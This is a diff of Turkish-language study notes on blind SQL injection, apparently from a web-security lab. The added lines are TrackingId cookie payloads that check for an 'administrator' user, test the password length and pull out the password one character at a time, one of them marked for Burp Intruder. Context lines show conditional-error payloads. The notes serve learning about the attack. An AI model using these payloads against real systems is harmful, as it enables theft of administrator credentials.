@@ -3,7 +3,13 @@
 ### Tanım
 - SELECT * FROM sessions WHERE TrackingId = 'xyz123';
 - SELECT * FROM users WHERE TrackingId = 'xyz' AND '1'='1'
+- TrackingId=JNwDzr5zsVqhNLyC' AND '1'='1
 - SELECT * FROM users WHERE TrackingId = 'xyz' AND '1'='2'
+- TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a 
+- TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a ==> welcome back
+-  TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+- TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+- 
 
 -------------------------------------
 
@@ -29,7 +35,7 @@ AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 
 SELECT * FROM Users WHERE TrackingId = 'xyz' 
 AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'
 
-📌 Açıklama:
+Açıklama:
 
     CASE WHEN (1=2) THEN 1/0 ELSE 'a' END
         (1=2) → FALSE döner
